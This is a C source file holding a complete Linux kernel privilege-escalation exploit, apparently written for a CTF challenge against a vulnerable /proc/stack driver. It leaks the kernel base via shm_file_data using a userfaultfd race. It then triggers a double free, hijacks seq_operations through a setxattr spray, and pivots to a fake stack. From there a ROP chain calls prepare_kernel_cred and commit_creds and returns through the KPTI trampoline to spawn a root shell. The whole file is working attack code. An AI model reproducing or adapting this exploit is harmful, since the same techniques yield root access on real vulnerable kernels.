#define _GNU_SOURCE

#include<sys/types.h>
#include<stdio.h>
#include<linux/userfaultfd.h>
#include<pthread.h>
#include<errno.h>
#include<stdlib.h>
#include<fcntl.h>
#include<signal.h>
#include<string.h>
#include<sys/mman.h>
#include<sys/syscall.h>
#include<poll.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>
#include<sys/prctl.h>
#include<sys/shm.h>
#include<sys/xattr.h>

#define errExit(msg) do { perror("\n"); perror(msg); \
                          exit(EXIT_FAILURE); \
                     } while (0)

#define POP     0x57ac0002
#define PUSH    0x57ac0001

ulong user_cs;
ulong user_rsp;
ulong user_ss;
ulong user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
  	"movq %%rsp, %3\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags), "=r" (user_rsp) : : "memory" );
}


int fd;

struct Element{
    int owner;
    unsigned long value;
    struct Element *fd;
};

int _push(ulong *data)
{
  if(ioctl(fd, PUSH, data) < 0)
    if(errno == EINVAL){
      printf("[-] copy_from_user failed.\n");
      errno = 0;
    }else
      errExit("_push");

  printf("[+] 5. END. pushed\n");
  return 0;
}

int _pop(ulong *givenbuf)
{
  if(ioctl(fd, POP, givenbuf) < 0)
    errExit("_pop");

  printf("[+] poped\n");
  return 0;
}



/* userfaultfd start */

#define PAGE_SIZE 0x1000

unsigned long addr = 0x117117000;
unsigned long len = PAGE_SIZE * 0x10;
char *buf[PAGE_SIZE];
unsigned long kbase;


static void *fault_handler_thread(void *arg)
{
    printf("[+] entered fault_handler_thread\n");

    static struct uffd_msg msg; // data read from userfaultfd
    struct uffdio_copy uffdio_copy;
    struct uffdio_range uffdio_range;
    long uffd = (long) arg;
    struct pollfd pollfd;
    int nready;  // number of polled events

    // set poll information
    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    unsigned long leak_buf;

    // wait for poll
    printf("[+] 2. polling..\n");

    while (poll(&pollfd, 1, -1) > 0)
    {
        if (pollfd.events & POLLERR || pollfd.events & POLLHUP)
            errExit("[-] failed at polling");
        
        /***** 1st thread: read an event *****/
        if (read(uffd, &msg, sizeof(msg)) == 0)
            errExit("[-] failed at reading event");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("[-] unexpected pagefault");

        printf("[!] 4. page fault: %p\n", msg.arg.pagefault.address);

        /***** 2nd thread: thread is halting. *****/
        _pop(&leak_buf);  // leak shm_file_data->ipc_namespace --- 0xffffffff81c37bc0
        kbase = leak_buf - 0xc37bc0;
        printf("[+] 4. Kernel base: 0x%llx\n", kbase);

        // cause doble-free at copy_from_user
        mprotect(msg.arg.pagefault.address & ~(PAGE_SIZE-1), PAGE_SIZE, PROT_NONE);
        printf("[+] 0x%llx is mprotected for double-free\n", msg.arg.pagefault.address & ~(PAGE_SIZE-1));

        uffdio_range.start = msg.arg.pagefault.address & ~(PAGE_SIZE-1);
        uffdio_range.len = PAGE_SIZE;
        if(ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range) == -1)
            errExit("ioctl-UFFDIO_UNREGISTER");
        printf("[+] unregistered supervisored region.\n");

        // forge user bufer passed into copy_from_user()
        // which doesnt take a lock cuz called in unlocked_ioctl
        // uffdio_copy.src = buf;
        // uffdio_copy.dst = addr;
        // uffdio_copy.len = len;
        // uffdio_copy.mode = 0;
        // if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        //     errExit("[-] failed at ioctl UFFDIO_COPY");
        
        break;
    }

    printf("[+] 4. exiting fault_handler_thrd\n");
}

void register_userfaultfd_and_halt(void)
{
    printf("[+] 1. registering userfaultfd..\n");

    long uffd;
    pthread_t thr;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    // create userfaultfd file descr. (no libc wrapper)
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("[-] failed at userfaultfd syscall");

    // enable uffd object via ioctl(UFFDIO_API)
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("[-] failed at ioctl UFFDIO_API");

    printf("[+] 1. mmaping..\n");
    // set MAP_FIXED for memory to be mapped on exactly
    // specified arbitrary addr.
    addr = mmap(addr, len,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
            -1, 0);
    if (addr == MAP_FAILED)
        errExit("[-] failed at mmap");
    else
        printf("[+] 1. mmapped..\n");

    uffdio_register.range.start = addr;
    uffdio_register.range.len = PAGE_SIZE * 0x10;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("[-] failed at ioctl UFFDIO_REGISTER");

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *)uffd);
    if (s != 0) {
        errno = s;
        errExit("[-] failed at pthread_create");
    }

    printf("[+] 1. register userfaultfd\n");
}

/* userfaultfd end */

// ffffffff811dd030 t shm_release

void call_shmat(void)
{
    int shmid;
    void *shmat_addr;
    pid_t pid;
    if ((pid = fork()) == 0){
        if ((shmid = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600)) == -1)
            errExit("shmget fail");
        if ((shmat_addr = shmat(shmid, NULL, SHM_RDONLY)) == -1)
            errExit("shmat fail");
        if (shmctl(shmid, IPC_RMID, NULL) == -1)
            errExit("shmctl");
        printf("[ ] 2.1 Success call_shmat: %p\n", shmat_addr);
        printf("[ ] 2.1 Child is exiting...\n");
        exit(0);
    }
    wait(pid);
    printf("[ ] 2.1 Parent is returning...\n");
}




// / # cat /proc/kallsyms | grep commit_creds | head -n 1
// ffffffff81069c10 T commit_creds
// / # cat /proc/kallsyms | grep _text | head -n 1
// ffffffff81000000 T _text
// / # cat /proc/kallsyms | grep prepare_kernel_cred | head -n 1
// ffffffff81069e00 T prepare_kernel_cred
// / # cat /proc/kallsyms | grep swapgs_restore
// ffffffff81600a34 T swapgs_restore_regs_and_return_to_usermode

void pop_shell(void)
{
    printf("[+] w00t w00t\n");
    system("/bin/sh -i");
//       char *argv2[] = {"/bin/sh",NULL};
//   char *envp2[] = {NULL};
//   execve("/bin/sh",argv2,envp2);
}

int main()
{
    int sfd;
    ulong *fstack;

    save_state();

    if ((fd = open("/proc/stack", O_RDONLY)) < 0)
        errExit("[-] failed at open");

    // leak
    register_userfaultfd_and_halt();
    sleep(1);

    call_shmat();
    printf("[*] 3 PUSH\n");
    _push(addr); // invoke fault

    // AAR is done. Now AAW
    // shm_file_data has shm_release() routine for UAF.
    // We can use seq_operations for AAW
    // which is kmalloc-32 as well.
    sfd = open("/proc/self/stat", O_RDONLY);

    /* ROP */
    ulong *rop;

    // 0xffffffff81034505 : pop rdi ; ret
    ulong pop_rdi = kbase + 0x034505;
    ulong prepare_kernel_cred = kbase + 0x069e00;
    ulong commit_creds = kbase + 0x69c10;
    ulong kpti_trampoline = kbase + 0x600a34 + 0x16; // skip pop...

    // 0xffffffff8105832b : mov esp, 0x83c389c0 ; ret
    ulong kspace_stack_pivot = kbase + 0x05832b;

    // 0xffffffff8121f89a : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8121f88d ; pop rbp ; ret
    ulong mov_rdi_rax = kbase + 0x21f89a;

    // 0xffffffff81038af4 : pop rcx ; ret
    ulong pop_rcx = kbase + 0x038af4;

    char buf[0x20];
    for(int ix=0; ix!=4; ++ix) // first 8byte is useless.
        *(ulong*)(buf+ix*8) = kspace_stack_pivot;

    setxattr("/tmp", "novitoll", buf, 0x20, XATTR_CREATE);

    // alloc fake stack for 0x83C389C0
    fstack = mmap(0x83C38000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if(fstack != 0x83C38000)
        errExit("fstack");
    
    rop = (ulong *) 0x83C389c0;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;

    *rop++ = pop_rcx;
    *rop++ = 0;

    *rop++ = mov_rdi_rax;
    *rop++ = 0; // rbp
    *rop++ = commit_creds;

    *rop++ = kpti_trampoline;
    *rop++ = 0; // rax
    *rop++ = 0; // rdi
    
    *rop++ = (ulong) pop_shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;
    
    read(sfd, buf, 0x10);

    return 0;
}